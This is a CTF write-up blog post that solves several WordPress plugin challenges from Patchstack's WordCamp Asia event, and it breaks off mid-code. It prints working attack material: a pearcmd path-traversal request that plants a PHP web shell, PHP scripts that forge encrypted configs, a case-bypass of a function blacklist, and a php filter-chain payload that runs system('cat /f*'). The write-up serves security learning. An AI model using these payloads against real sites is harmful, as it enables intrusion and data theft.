[{"content":"Intro So i participated in Patchstack\u0026rsquo;s third hosted CTF event, this time it\u0026rsquo;s WordCamp Asia CTF. I managed to solve 7/10 challenges along the way and secured 3rd place in the leaderboard. The difficulty definitely harder than last patchstack CTF (in my opinion), but still fun. I learn a lot of cool tricks, specially in PHP and WordPress environment. Kudos to all problem setters, you guys did a great job ðŸ”¥ðŸ”¥ Challenges Unfortunately, i\u0026rsquo;m unable to solve all challenges. But let\u0026rsquo;s see what im solve so far ðŸ˜‰\nA Nice Block I like the new Gutemberg editor, so I just installed a plugin with beautiful blocks addons. That\u0026rsquo;s a great plugin that perfectly matches my design needs, I don\u0026rsquo;t think it could cause a security issue, right?\nThis is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).\nThis is the easiest challenge (because it was the most solved challenge).\nin the given source code, we can observe that it try to install kiwiblocks plugins. The plugin itself already provided in the source code, so we can started by analyzing the plugin\u0026rsquo;s code. One of the files that caught my eyes were panel.php it\u0026rsquo;ll search for tab parameter, and then tries to include it without any proper sanitation. This approach is definitely unsafe and vulnerable to Path Traversal File Inclusions. This vuln can be used to load any files within the server.\nSince it uses wordpress image from docker, then we can use pearcmd tricks to gain code execution. This is due register_argc_argv is always enabled and php pear is always installed in wordpress docker image.\nI sent a request to /wp-content/plugins/kiwiblocks/src/admin-panel/views/panel.php?+config-create+/\u0026amp;tab=../../../../../../../../../../../usr/local/lib/php/pearcmd.php\u0026amp;/\u0026lt;?system($_GET[0])?\u0026gt;+/tmp/beluganothere.php to upload a web shell within tmp directory. Then use the same vuln to access the uploaded file. We got the flag! Flag: CTF{TABBING_THE_TAB_0z933}\nPatchstack Scheduler Pro Patchstack needed to update their Blog content and asked a freelancer to make a plugin for scheduling their newest advisories. It has not been tested yet can you check it for us?\nIn this challenge, we were given a custom plugins called patchstack scheduler pro. If take a look in Makefile, we can see that it tries to insert 50 draft random posts with one of them containing ps_api_token. Let\u0026rsquo;s note this for later. In the plugin index files, we can see that it registered several ajax actions. All of them have nopriv prefix, so it can be accessed from unauthenticated users.\n1 2 3 4 5 6 7 8 add_action(\u0026#39;admin_menu\u0026#39;, array($this, \u0026#39;add_admin_menu\u0026#39;)); add_action(\u0026#39;admin_enqueue_scripts\u0026#39;, array($this, \u0026#39;enqueue_admin_assets\u0026#39;)); add_action(\u0026#39;wp_ajax_nopriv_patchstack_scheduler_preview\u0026#39;, array($this, \u0026#39;handle_preview_request\u0026#39;)); add_action(\u0026#39;wp_ajax_patchstack_scheduler_preview\u0026#39;, array($this, \u0026#39;handle_preview_request\u0026#39;)); add_action(\u0026#39;wp_ajax_nopriv_patchstack_scheduler_compare\u0026#39;, array($this, \u0026#39;handle_compare_request\u0026#39;)); add_action(\u0026#39;wp_ajax_patchstack_scheduler_compare\u0026#39;, array($this, \u0026#39;handle_compare_request\u0026#39;)); add_action(\u0026#39;wp_ajax_nopriv_patchstack_scheduler_settings\u0026#39;, array($this, \u0026#39;handle_settings_request\u0026#39;)); add_action(\u0026#39;wp_ajax_patchstack_scheduler_settings\u0026#39;, array($this, \u0026#39;handle_settings_request\u0026#39;)); Let\u0026rsquo;s analyze each of the ajax actions. I\u0026rsquo;ll started with handle_preview_request\n1 2 3 4 5 6 7 8 9 10 11 12 public function handle_preview_request() { $post_id = isset($_GET[\u0026#39;post_id\u0026#39;]) ? intval($_GET[\u0026#39;post_id\u0026#39;]) : 0; $post = get_post($post_id); if (!$post) { wp_send_json_error(\u0026#39;Post not found\u0026#39;); return; } wp_send_json_success(array( \u0026#39;content\u0026#39; =\u0026gt; $post-\u0026gt;post_content, \u0026#39;title\u0026#39; =\u0026gt; $post-\u0026gt;post_title )); } it will ask for post_id parameter, and then return post content if any. This action doesn\u0026rsquo;t check for post status so we can read any post content in the site, even if the post status is draft or private.\nFor the second ajax handle_compare_request, we got following code\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public function handle_compare_request() { $raw_data = file_get_contents(\u0026#39;php://input\u0026#39;); $content_type = isset($_SERVER[\u0026#39;CONTENT_TYPE\u0026#39;]) ? $_SERVER[\u0026#39;CONTENT_TYPE\u0026#39;] : \u0026#39;\u0026#39;; if (strpos($content_type, \u0026#39;application/json\u0026#39;) !== false) { $data = json_decode($raw_data, true); } else { $data = $_POST; } if (!isset($data[\u0026#39;api_token\u0026#39;]) || $data[\u0026#39;api_token\u0026#39;] !== get_option(\u0026#39;ps_api_token\u0026#39;)) { wp_send_json_error(\u0026#39;Invalid API token\u0026#39;); return; } if (!isset($data[\u0026#39;encryption_key\u0026#39;]) || $data[\u0026#39;encryption_key\u0026#39;] != $this-\u0026gt;encryption_key) { wp_send_json_error(\u0026#39;Invalid encryption key\u0026#39;); return; } if (isset($data[\u0026#39;revision_data\u0026#39;]) \u0026amp;\u0026amp; isset($data[\u0026#39;revision_data\u0026#39;][\u0026#39;post_status\u0026#39;])) { $status = $data[\u0026#39;revision_data\u0026#39;][\u0026#39;post_status\u0026#39;]; if ($status === \u0026#39;draft\u0026#39;) { $config = $this-\u0026gt;get_encrypted_config(); wp_send_json_success(array(\u0026#39;encrypted_config\u0026#39; =\u0026gt; $config)); return; } } wp_send_json_error(\u0026#39;Invalid revision data\u0026#39;); } It will try to read POST data as JSON, then perform several checks as follows:\nit will check if api_token is match with one in the wp options. Note that it uses strict comparasion !== try to check if encryption_key is same with value stored in the plugins. Note that it use loose comparasion != try to check if revision_data is exists, and revision_data.post_status value is set to draft If all criteria were met, then it will return encrypted config using get_encryption_config method.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private function get_encrypted_config() { $config = array( \u0026#39;status\u0026#39; =\u0026gt; \u0026#39;draft\u0026#39;, \u0026#39;permissions\u0026#39; =\u0026gt; array( \u0026#39;view\u0026#39; =\u0026gt; true, \u0026#39;edit\u0026#39; =\u0026gt; false ), \u0026#39;encryption_key\u0026#39; =\u0026gt; $this-\u0026gt;encryption_key ); $uuid = substr($this-\u0026gt;encryption_key, 0, 16); $encrypted = openssl_encrypt( json_encode($config), \u0026#39;AES-256-CBC\u0026#39;, $uuid, 0, $uuid ); return base64_encode($uuid . base64_decode($encrypted)); } This method will encrypt the current plugin config with AES-256-CBC algorithm, but using the same value for both KEY \u0026amp; IV. It also append the plaintext IV into the base64 encoded data. So if we try to base64 decode, and then substract the first 16 character, then we\u0026rsquo;ll get the KEY to decrypt the remaining data.\nsounds great, right? but how can we fullfill the checking criteria described before?\nfor the first check, we can use IDOR within handle_preview_request to leak api_token from the draft post. We need to bruteforce a bit here since it was hidden within other 50 posts. In this case, i was able to found the correct post in id 36. Then how about encryption_key? we dont have any way to get the value of the key.. right? well, yes, but no.\nwe don\u0026rsquo;t need to know the actual value of the encryption_key since it was using loose operator to compare. Since the POST is in JSON format, then we can use true as the value. This type of attack is well known as Type Juggling.\nthen we can craft the other value accordingly to get the encrypted config. We can decode the base64 data to obtain the encryption key\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php $decoded = base64_decode(\u0026#34;MWEwNDY1YWQtMTFkMy00NG3dDSyMtvZuU+aUR3m+mhbmL97Xms5PKdE68WEwW3Qm54qJ9mGDY4Ar39kDk23WXzu5T7MZ/RKX2bdbRO7jcbp1ALhvPEpVM2LAM0a6y+cnM7bok0/lA2APiaurEdz4eH6xddsf6RQ/AeO9QNCZI/1iQC1rpGJyA40KmhIwl6Vg\u0026#34;); $uuid = substr($decoded, 0, 16); $enc = substr($decoded, 16); echo \u0026#34;KEY \u0026amp; IV: \u0026#34; . $uuid . \u0026#34;\\n\u0026#34;; $decrypted = openssl_decrypt( base64_encode($enc), \u0026#39;AES-256-CBC\u0026#39;, \u0026#34;1a0465ad-11d3-44\u0026#34;, 0, \u0026#34;1a0465ad-11d3-44\u0026#34; ); echo \u0026#34;Decrypted: \u0026#34; . $decrypted . \u0026#34;\\n\u0026#34;; Here we found the full encryption_key. This will be handy later on.\nNow let\u0026rsquo;s analyze the third ajax, handle_settings_request.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 public function handle_settings_request() { $data = json_decode(file_get_contents(\u0026#39;php://input\u0026#39;), true); if (!isset($data[\u0026#39;config\u0026#39;])) { wp_send_json_error(\u0026#39;Missing config\u0026#39;); return; } try { $decoded = base64_decode($data[\u0026#39;config\u0026#39;]); $uuid = substr($decoded, 0, 16); $encrypted = substr($decoded, 16); $decrypted = openssl_decrypt( base64_encode($encrypted), \u0026#39;AES-256-CBC\u0026#39;, $this-\u0026gt;encryption_key, 0, $uuid ); $config = json_decode($decrypted, true); if ($config \u0026amp;\u0026amp; isset($config[\u0026#39;status\u0026#39;]) \u0026amp;\u0026amp; $config[\u0026#39;status\u0026#39;] === \u0026#39;publish\u0026#39; \u0026amp;\u0026amp; isset($config[\u0026#39;permissions\u0026#39;][\u0026#39;all\u0026#39;]) \u0026amp;\u0026amp; $config[\u0026#39;permissions\u0026#39;][\u0026#39;all\u0026#39;] === true \u0026amp;\u0026amp; isset($config[\u0026#39;flag_access\u0026#39;]) \u0026amp;\u0026amp; $config[\u0026#39;flag_access\u0026#39;] === true) { $flag = @file_get_contents(\u0026#39;/flag.txt\u0026#39;); wp_send_json_success(array( \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;Configuration updated\u0026#39;, \u0026#39;flag\u0026#39; =\u0026gt; trim($flag) )); return; } wp_send_json_success(array(\u0026#39;message\u0026#39; =\u0026gt; \u0026#39;Configuration updated\u0026#39;)); } catch (Exception $e) { wp_send_json_error(\u0026#39;Invalid configuration\u0026#39;); } } It will read JSON body, then check if base64 encoded config data is match with the validation. Note that this time the config is decrypted using encryption_key. Since we already know the full value of encryption_key, then we can also craft the correct config format to read the flag.\nBelow is the script used to craft the correct config data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $key = \u0026#34;1a0465ad-11d3-440c-9b80-42d429652c9c\u0026#34;; $uuid = \u0026#34;1a0465ad-11d3-44\u0026#34;; $enkrip = array( \u0026#34;status\u0026#34; =\u0026gt; \u0026#34;publish\u0026#34;, \u0026#34;permissions\u0026#34; =\u0026gt; array(\u0026#34;all\u0026#34; =\u0026gt; true), \u0026#34;flag_access\u0026#34; =\u0026gt; true, \u0026#34;encryption_key\u0026#34; =\u0026gt; \u0026#34;1a0465ad-11d3-440c-9b80-42d429652c9c\u0026#34; ); $enkrip = json_encode($enkrip); $encrypted = openssl_encrypt( $enkrip, \u0026#39;AES-256-CBC\u0026#39;, $key, 0, $uuid ); $final = $uuid . base64_decode($encrypted); $encoded = base64_encode($final); echo \u0026#34;Encrypted: \u0026#34; . $encoded; Flag Obtained! Flag: CTF{crypt0_aint_crypt0ing_patchstack2o25}\nSup3rcustomiz3r My friend is developing a cool plugin to help me customize my Login page, isn\u0026rsquo;t that nice? So many stuff and options, I\u0026rsquo;m sure it\u0026rsquo;s 100% safe to use\u0026hellip;\nThis is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).\nin the given challenge file, we can observe that it only uses one plugin called login-customizer There were several ajax action in the plugins.\nLet\u0026rsquo;s try to analyze the unauthenticated ajax. patchstack_get_the_flag action will try to sent a flag if we logged in with any of the whitelisted roles (administrator, author, contributor)\n1 2 3 4 5 6 7 8 9 10 11 function get_the_flag() { $user = wp_get_current_user(); $allowed_roles = [\u0026#34;administrator\u0026#34;, \u0026#34;author\u0026#34;, \u0026#34;contributor\u0026#34;]; if (array_intersect($allowed_roles, $user-\u0026gt;roles)) { $value = file_get_contents(\u0026#39;/flag.txt\u0026#39;); wp_send_json_success([\u0026#34;value\u0026#34; =\u0026gt; $value]); } else { wp_send_json_error(\u0026#34;Unauthorized\u0026#34;); } } login_register_user action allow us to register in the site, and then set the default_role to subscriber. Note that the registration role is not set within wp_create_user function. In this case, then it will use role defined in default_role option value.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 function login_register_user() { $username = sanitize_user($_POST[\u0026#39;username\u0026#39;]); $email = sanitize_email($_POST[\u0026#39;email\u0026#39;]); $password = $_POST[\u0026#39;password\u0026#39;]; if (empty($username) || empty($email) || empty($password)) { wp_send_json_error(array( \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;All fields (username, email, password) are required.\u0026#39;, )); } if (!is_email($email)) { wp_send_json_error(array( \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;Invalid email address.\u0026#39;, )); } if (username_exists($username) || email_exists($email)) { wp_send_json_error(array( \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;Username or email already exists.\u0026#39;, )); } $user_id = wp_create_user($username, $password, $email); update_option(\u0026#34;default_role\u0026#34;, \u0026#34;subscriber\u0026#34;); if (is_wp_error($user_id)) { wp_send_json_error(array( \u0026#39;message\u0026#39; =\u0026gt; $user_id-\u0026gt;get_error_message(), )); } wp_send_json_success(array( \u0026#39;message\u0026#39; =\u0026gt; \u0026#39;User registered successfully.\u0026#39;, \u0026#39;user_id\u0026#39; =\u0026gt; $user_id )); } We also had interesting authenticated ajax action that can be used to set options 1 2 3 4 5 6 7 8 9 function set_option() { if ( isset( $_POST[\u0026#39;_wpnonce\u0026#39;] ) \u0026amp;\u0026amp; wp_verify_nonce( sanitize_text_field( wp_unslash( $_POST[\u0026#39;_wpnonce\u0026#39;] ) ), \u0026#39;login-customizer-admin\u0026#39; ) ) { $op = sanitize_text_field($_POST[\u0026#39;option\u0026#39;]); $val = sanitize_text_field($_POST[\u0026#39;value\u0026#39;]); update_option($op, $val); wp_send_json_success( \u0026#39;Option has been saved\u0026#39;, 201 ); } } this action doesn\u0026rsquo;t validate to user role at all. It just perform validation based on the nonce validation. So in theory, if any authenticated users able to obtain nonce value of login-customizer-admin, then they can access this ajax and update arbitrary wp options.\nIf we try to trace the nonce generation, we can found that it was generated in preview_data method if is_preview_mode method is true. is_preview_mode just try to search if there\u0026rsquo;s preview parameter set.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public function is_preview_mode() { // Check if preview page is the current page. if ( isset( $_GET[\u0026#39;preview\u0026#39;] ) ) { return true; } else { return false; } } public function preview_data() { if ( ! $this-\u0026gt;is_preview_mode() ) { return; } echo \u0026#39;\u0026lt;script\u0026gt;var _customizePartialRefreshExports = \u0026#34;\u0026#34;;var _ldAdminNounce = \u0026#39;.wp_create_nonce( \u0026#39;login-customizer-admin\u0026#39;).\u0026#39;\u0026#34;\u0026lt;/script\u0026gt;\u0026#39;; } this method were called within __construct method of Login_Customizer_Customizer_Scripts. The method also initialized directly in the end of file.\n1 2 3 4 5 6 7 8 9 10 11 12 class Login_Customizer_Customizer_Scripts { /** * The class constructor. * Adds actions to enqueue our assets. */ public function __construct() { add_action( \u0026#39;wp_footer\u0026#39;, array( $this, \u0026#39;preview_data\u0026#39; ), 1000 ); } } new Login_Customizer_Customizer_Scripts(); the file also included in the plugin\u0026rsquo;s index file. so basically it was applied in any pages. This mean we can put ?preview=anything params into any pagaes as authenticated users to obtain the nonce value.\nLet\u0026rsquo;s try to create new user. If you login and then access any page with the preview parameter, we will obtain the nonce value. with the authenticated cookie \u0026amp; nonce value, we can then access set_option ajax.\nthis allows us to set default_role options to contibutor, and we can just register again to get users with contributor role.\nwith the contributor role account, we can now get the flag. Flag: CTF{TUNING_NOT_FOR_THE_WIN_0z933}\nCool Templates I had someone build me a plugin so I can send out some links with special footers. I\u0026rsquo;m sure the code is safe, right?\nThis is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).\nIn this challenge, we were given single plugin called custom-footer\nThe plugin only have single files below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /** * Plugin Name: Custom Footer * Description: Adds a custom footer to every page. * Version: 1.0 * Author: Dev Eloper */ if (!defined(\u0026#39;ABSPATH\u0026#39;)) { exit; // Prevent direct access } function simpletext($text = \u0026#34;Default Footer Text\u0026#34;) { return \u0026#34;\u0026lt;footer style=\u0026#39;text-align:center; padding:10px; background:#f1f1f1;\u0026#39;\u0026gt;{$text}\u0026lt;/footer\u0026gt;\u0026#34;; } function bigtext($text = \u0026#34;Default Footer Text\u0026#34;) { return \u0026#34;\u0026lt;footer style=\u0026#39;text-align:center; padding:10px; background:#333; color:#fff;\u0026#39;\u0026gt;{$text}\u0026lt;/footer\u0026gt;\u0026#34;; } function gradientfooter($text = \u0026#34;Default Footer Text\u0026#34;) { return \u0026#34;\u0026lt;footer style=\u0026#39;text-align:center; padding:15px; background:linear-gradient(to right, #ff7e5f, #feb47b); color:#fff;\u0026#39;\u0026gt;{$text}\u0026lt;/footer\u0026gt;\u0026#34;; } function add_custom_footer() { $blacklist = array(\u0026#34;system\u0026#34;, \u0026#34;passthru\u0026#34;, \u0026#34;proc_open\u0026#34;, \u0026#34;shell_exec\u0026#34;, \u0026#34;include_once\u0026#34;, \u0026#34;require\u0026#34;, \u0026#34;require_once\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;fopen\u0026#34;,\u0026#39;fopen\u0026#39;, \u0026#39;tmpfile\u0026#39;, \u0026#39;bzopen\u0026#39;, \u0026#39;gzopen\u0026#39;, \u0026#39;chgrp\u0026#39;, \u0026#39;chmod\u0026#39;, \u0026#39;chown\u0026#39;, \u0026#39;copy\u0026#39;, \u0026#39;file_put_contents\u0026#39;, \u0026#39;lchgrp\u0026#39;, \u0026#39;lchown\u0026#39;, \u0026#39;link\u0026#39;, \u0026#39;mkdir\u0026#39;, \u0026#39;move_uploaded_file\u0026#39;, \u0026#39;rename\u0026#39;, \u0026#39;rmdir\u0026#39;, \u0026#39;symlink\u0026#39;, \u0026#39;tempnam\u0026#39;, \u0026#39;touch\u0026#39;, \u0026#39;unlink\u0026#39;, \u0026#39;imagepng\u0026#39;, \u0026#39;imagewbmp\u0026#39;, \u0026#39;image2wbmp\u0026#39;, \u0026#39;imagejpeg\u0026#39;, \u0026#39;imagexbm\u0026#39;, \u0026#39;imagegif\u0026#39;, \u0026#39;imagegd\u0026#39;, \u0026#39;imagegd2\u0026#39;, \u0026#39;iptcembed\u0026#39;, \u0026#39;ftp_get\u0026#39;, \u0026#39;ftp_nb_get\u0026#39;, \u0026#39;file_exists\u0026#39;, \u0026#39;file_get_contents\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;fileatime\u0026#39;, \u0026#39;filectime\u0026#39;, \u0026#39;filegroup\u0026#39;, \u0026#39;fileinode\u0026#39;, \u0026#39;filemtime\u0026#39;, \u0026#39;fileowner\u0026#39;, \u0026#39;fileperms\u0026#39;, \u0026#39;filesize\u0026#39;, \u0026#39;filetype\u0026#39;, \u0026#39;glob\u0026#39;, \u0026#39;is_dir\u0026#39;, \u0026#39;is_executable\u0026#39;, \u0026#39;is_file\u0026#39;, \u0026#39;is_link\u0026#39;, \u0026#39;is_readable\u0026#39;, \u0026#39;is_uploaded_file\u0026#39;, \u0026#39;is_writable\u0026#39;, \u0026#39;is_writeable\u0026#39;, \u0026#39;linkinfo\u0026#39;, \u0026#39;lstat\u0026#39;, \u0026#39;parse_ini_file\u0026#39;, \u0026#39;pathinfo\u0026#39;, \u0026#39;readfile\u0026#39;, \u0026#39;readlink\u0026#39;, \u0026#39;realpath\u0026#39;, \u0026#39;stat\u0026#39;, \u0026#39;gzfile\u0026#39;, \u0026#39;readgzfile\u0026#39;, \u0026#39;getimagesize\u0026#39;, \u0026#39;imagecreatefromgif\u0026#39;, \u0026#39;imagecreatefromjpeg\u0026#39;, \u0026#39;imagecreatefrompng\u0026#39;, \u0026#39;imagecreatefromwbmp\u0026#39;, \u0026#39;imagecreatefromxbm\u0026#39;, \u0026#39;imagecreatefromxpm\u0026#39;, \u0026#39;ftp_put\u0026#39;, \u0026#39;ftp_nb_put\u0026#39;, \u0026#39;exif_read_data\u0026#39;, \u0026#39;read_exif_data\u0026#39;, \u0026#39;exif_thumbnail\u0026#39;, \u0026#39;exif_imagetype\u0026#39;, \u0026#39;hash_file\u0026#39;, \u0026#39;hash_hmac_file\u0026#39;, \u0026#39;hash_update_file\u0026#39;, \u0026#39;md5_file\u0026#39;, \u0026#39;sha1_file\u0026#39;, \u0026#39;highlight_file\u0026#39;, \u0026#39;show_source\u0026#39;, \u0026#39;php_strip_whitespace\u0026#39;, \u0026#39;get_meta_tags\u0026#39;, \u0026#39;extract\u0026#39;, \u0026#39;parse_str\u0026#39;, \u0026#39;putenv\u0026#39;, \u0026#39;ini_set\u0026#39;, \u0026#39;mail\u0026#39;, \u0026#39;header\u0026#39;, \u0026#39;proc_nice\u0026#39;, \u0026#39;proc_terminate\u0026#39;, \u0026#39;proc_close\u0026#39;, \u0026#39;pfsockopen\u0026#39;, \u0026#39;fsockopen\u0026#39;, \u0026#39;apache_child_terminate\u0026#39;, \u0026#39;posix_kill\u0026#39;, \u0026#39;posix_mkfifo\u0026#39;, \u0026#39;posix_setpgid\u0026#39;, \u0026#39;posix_setsid\u0026#39;, \u0026#39;posix_setuid\u0026#39;, \u0026#39;phpinfo\u0026#39;, \u0026#39;posix_mkfifo\u0026#39;, \u0026#39;posix_getlogin\u0026#39;, \u0026#39;posix_ttyname\u0026#39;, \u0026#39;getenv\u0026#39;, \u0026#39;get_current_user\u0026#39;, \u0026#39;proc_get_status\u0026#39;, \u0026#39;get_cfg_var\u0026#39;, \u0026#39;disk_free_space\u0026#39;, \u0026#39;disk_total_space\u0026#39;, \u0026#39;diskfreespace\u0026#39;, \u0026#39;getcwd\u0026#39;, \u0026#39;getlastmo\u0026#39;, \u0026#39;getmygid\u0026#39;, \u0026#39;getmyinode\u0026#39;, \u0026#39;getmypid\u0026#39;, \u0026#39;getmyuid\u0026#39;, \u0026#39;create_function\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;popen\u0026#39;, \u0026#39;proc_open\u0026#39;, \u0026#39;pcntl_exec\u0026#39;); if (isset($_REQUEST[\u0026#39;template\u0026#39;]) \u0026amp;\u0026amp; isset($_REQUEST[\u0026#39;content\u0026#39;])) { $template = $_REQUEST[\u0026#39;template\u0026#39;]; $content = wp_unslash(urldecode(base64_decode($_REQUEST[\u0026#39;content\u0026#39;]))); if(preg_match(\u0026#39;/^[a-zA-Z0-9]+$/\u0026#39;, $template) \u0026amp;\u0026amp; !in_array($template, $blacklist)) { $footer = $template($content); echo $footer; } } } add_action(\u0026#39;wp_footer\u0026#39;, \u0026#39;add_custom_footer\u0026#39;); It ask for template and content parameter, perform some validation (only allow alphanumeric characters and check for blacklisted function), base64 \u0026amp; url decode the content, and then perform dynamic function calls using $template($content);\nthen i thought\u0026hellip;\nso we can basically calls any function that alphanumeric and require only 1 required arguments.\nI try to search all possible php functions and wordpress function that match the criteria but found nothing. Author also said that this challenge were not meant to be solved in less than 2 days ðŸ¤¯\nso.. this should be the HARDEST challenges so far. Well\u0026hellip; if no unintended were found. Surely there isn\u0026rsquo;t unintended.. right?\nwell, there is!\nupon closer inspection, the validation only checks if template content is not in blacklist, but how about the case? PHP function can still be called even with inappropriate case.\nso we can bypass the protection and call system function like this. Flag obtained!\nFlag: CTF{C00l_T3mpl4t3s_759eee4d}\nBlocked it\u0026rsquo;s blocked, nothing to do here.\nNOTE: This is a fully white box challenge, almost no heavy brute force is needed.\nIn this challenge, we were given one plugins named test-plugin.\nIt only have single files below\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 if ( ! defined( \u0026#39;WPINC\u0026#39; ) ) { die; } define( \u0026#39;PLUGIN_NAME_PLUGIN_NAME\u0026#39;, \u0026#39;test-plugin\u0026#39; ); define( \u0026#39;PLUGIN_NAME_VERSION\u0026#39;, \u0026#39;1.0.0\u0026#39; ); define( \u0026#39;PLUGIN_NAME_URL\u0026#39;, plugin_dir_url( __FILE__ ) ); define( \u0026#39;PLUGIN_NAME_PATH\u0026#39;, plugin_dir_path( __FILE__ ) ); define( \u0026#39;PLUGIN_NAME_BASE_DIR\u0026#39;, plugin_dir_path( __FILE__ ) ); define( \u0026#39;PLUGIN_NAME_BASE_NAME\u0026#39;, plugin_basename( __FILE__ ) ); add_action(\u0026#34;init\u0026#34;, \u0026#34;set\u0026#34;); add_action(\u0026#34;rest_api_init\u0026#34;, \u0026#34;register_endpoints\u0026#34;); function set(){ update_option(\u0026#34;secretword_is_true\u0026#34;, \u0026#34;anything\u0026#34;); } function register_endpoints(){ register_rest_route( \u0026#39;test\u0026#39;, \u0026#39;/upload/(?P\u0026lt;somevalue\u0026gt;\\w+)\u0026#39;, [ \u0026#39;methods\u0026#39; =\u0026gt; WP_Rest_Server::CREATABLE, \u0026#39;callback\u0026#39; =\u0026gt; \u0026#39;upload_something\u0026#39;, \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;check_request\u0026#39;, ]); } function check_request( $request ) { $some_value = trim( strtolower( $request[\u0026#39;somevalue\u0026#39;] ) ); if( empty( $some_value ) ) { return false; } if( ! preg_match( \u0026#39;/^secretword_/i\u0026#39;, $some_value) ) { return false; } if( $some_value == \u0026#39;secretword_is_true\u0026#39; ) { return false; } return true; } function upload_something($request){ $body = $request-\u0026gt;get_json_params(); $content = $body[\u0026#39;content\u0026#39;]; $name = $body[\u0026#39;name\u0026#39;]; $some_value = trim( strtolower( $request[\u0026#39;somevalue\u0026#39;] ) ); if(!get_option($some_value)){ echo \u0026#34;blocked\u0026#34;; exit(); } if(strlen($name) \u0026gt; 105){ echo \u0026#34;blocked.\u0026#34;; exit(); } $write = \u0026lt;\u0026lt;\u0026lt;EOF \u0026lt;?php exit(\u0026#39;ha?\u0026#39;); // $content EOF; var_dump($name . \u0026#39;.php\u0026#39;); var_dump($write); file_put_contents($name . \u0026#39;.php\u0026#39;, $write); return rest_ensure_response( \u0026#34;success\u0026#34; ); } The plugin defined one Rest API endpoint that will call upload_something function if check_request is True.\ncheck_request will search if there\u0026rsquo;s request parameter named somevalue, then check if it\u0026rsquo;s started with secretword_ and also check if the value is exactly secretword_is_true\nsound simple, right? param value such as secretword_is_false can be used to pass this checking.\nlet\u0026rsquo;s continue with the callback function. It will read JSON POST data, then try to search for somevalue properties (doesn\u0026rsquo;t matter if it\u0026rsquo;s in URL Param or JSON Body). It will try to get options for the somevalue and check if there\u0026rsquo;s any. It also checks the length name properties.\nIf all the requirement fullfilled, then it will put user\u0026rsquo;s content properties, and write it into user defined $name properties, with the extension of .php\nso here we have a problem:\nFirst of all, there\u0026rsquo;s option named secretword_is_true. We must use this as the somevalue params so we can pass the checking in upload_something. However if we doing so, then we can\u0026rsquo;t pass the restriction set in check_request. altough we can control the filename of the uploaded file, we can\u0026rsquo;t really execute php code. This is due to exit code in the content of the uploaded files. No matter the content we provide, it wont be executed. so, how can we solve the problem?\nAfter trying different method and approach, i suddenly remember that mysql doesn\u0026rsquo;t really care about nullbyte characters (%00). but due to usage of trim function in the plugin, we can\u0026rsquo;t use nullbyte characters ðŸ˜¥ Here\u0026rsquo;s the interesting part. When i try other characters, such as %01, suddenly it worked! I\u0026rsquo;m not sure which part (either wordpress or the database) is responsible for this tricks to be happend. But let\u0026rsquo;s say it\u0026rsquo;s because database were ignoring the %01 character, just like it ignoring %00.\nOk, so now we need to solve the second problem. How can we achieve code execution if the php script use exit function?\nwell apparently it\u0026rsquo;s a well known tricks that\u0026rsquo;ve been lying in the internet for long time. I accidentaly found the solution from chinese CTF writeup The solution was using php filter chain to remove all php tags, and then perform base64 decode to our payload. So in the end, the exit() code will be deleted.\nto make it easier to understand, here\u0026rsquo;s the chain workflow.\nOriginal PHP Code\n1 2 3 \u0026lt;?php exit(\u0026#39;ha?\u0026#39;); // YOUR PAYLOAD GOES HERE PHP Code after append. Content = ?\u0026gt;\\nPD9waHAgc3lzdGVtKCdjYXQgL2YqJyk7Pz4K\n1 2 3 4 \u0026lt;?php exit(\u0026#39;ha?\u0026#39;); // ?\u0026gt;PD9waHAgc3lzdGVtKCdjYXQgL2YqJyk7Pz4K Then when the file_put_contents try to write the file, it will delete the previous tags\n1 PD9waHAgc3lzdGVtKCdjYXQgL2YqJyk7Pz4K # not deleted because located outside of php tags Finally will perform base64 decode\n1 \u0026lt;?php system(\u0026#39;cat /f*\u0026#39;);?\u0026gt; # final content written to file Then we can access the uploaded content, and retrieve the flag Flag obtained! Flag: CTF{you_bypass_the_exit_nice_8b31009122dd}\nUp To You it\u0026rsquo;s all up to you.\nNOTE: This is a fully white box challenge, almost no heavy brute force is needed.\nIn this challenge, we were given three plugins. Flag is saved in the private posts. So the objective is to leak private post. Let\u0026rsquo;s started with custom plugins named test-plugin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 if ( ! defined( \u0026#39;WPINC\u0026#39; ) ) { die; } define( \u0026#39;PLUGIN_NAME_PLUGIN_NAME\u0026#39;, \u0026#39;test-plugin\u0026#39; ); define( \u0026#39;PLUGIN_NAME_VERSION\u0026#39;, \u0026#39;1.0.0\u0026#39; ); define( \u0026#39;PLUGIN_NAME_URL\u0026#39;, plugin_dir_url( __FILE__ ) ); define( \u0026#39;PLUGIN_NAME_PATH\u0026#39;, plugin_dir_path( __FILE__ ) ); define( \u0026#39;PLUGIN_NAME_BASE_DIR\u0026#39;, plugin_dir_path( __FILE__ ) ); define( \u0026#39;PLUGIN_NAME_BASE_NAME\u0026#39;, 